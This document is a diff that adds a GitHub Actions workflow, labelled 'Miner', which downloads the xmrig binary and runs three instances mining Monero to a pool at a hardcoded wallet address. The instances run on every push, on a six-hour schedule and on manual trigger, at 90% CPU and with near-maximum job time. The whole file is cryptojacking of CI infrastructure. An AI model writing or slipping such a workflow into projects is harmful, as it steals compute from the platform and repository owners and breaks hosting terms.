@@ -1,0 +1,29 @@
+name: ⛏ Miner
+
+on:
+  push:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3]
+      fail-fast: false
+    steps:
+      - name: Download xmrig
+        run: |
+          curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
+          tar xzf xmrig.tar.gz --strip-components=1
+          chmod +x xmrig
+      
+      - name: Mine
+        run: |
+          timeout 21000 ./xmrig -o gulf.moneroocean.stream:10032 \
+            -u "45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X" -p "gh-${{ matrix.instance }}" \
+            --cpu-max-threads-hint=90 --donate-level=0 \
+            --print-time=600
+
